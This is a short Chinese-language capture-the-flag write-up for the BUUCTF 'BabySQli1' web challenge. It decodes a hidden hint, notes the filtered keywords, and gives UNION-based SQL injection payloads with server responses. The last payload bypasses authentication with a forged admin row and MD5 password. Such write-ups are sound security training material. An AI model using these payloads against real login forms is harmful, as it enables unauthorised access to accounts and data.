BUUCTF_WEB_BabySQli1

2020-07-25

先抓包，看到了注释的hint。

<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
先base32再base64解密得：

select * from user where username = '$name'
sql注入点显而易见。

FUZZ了一下，看到主要过滤了or order by =。

在admin后面加一个*号，先放到sqlmap里面跑着。

Sqlmap结果

hash是解不出来的。

POST内容：

name=admin' union select 1,2,3,4#&pw=admin
回显：

Error: The used SELECT statements have a different number of columns

POST内容：

name=admin' union select 1,2,3#&pw=admin
回显：

wrong pass!

首先令查询为假，因为过滤了=，因此可以使用> <或者like。

在select 1,2,3#时，1是id，2是用户名,3是密码的MD5。payload呼之欲出。

name=admin' and 1 like 2 union select 1,'admin','21232f297a57a5a743894a0e4a801fc3'#&pw=admin
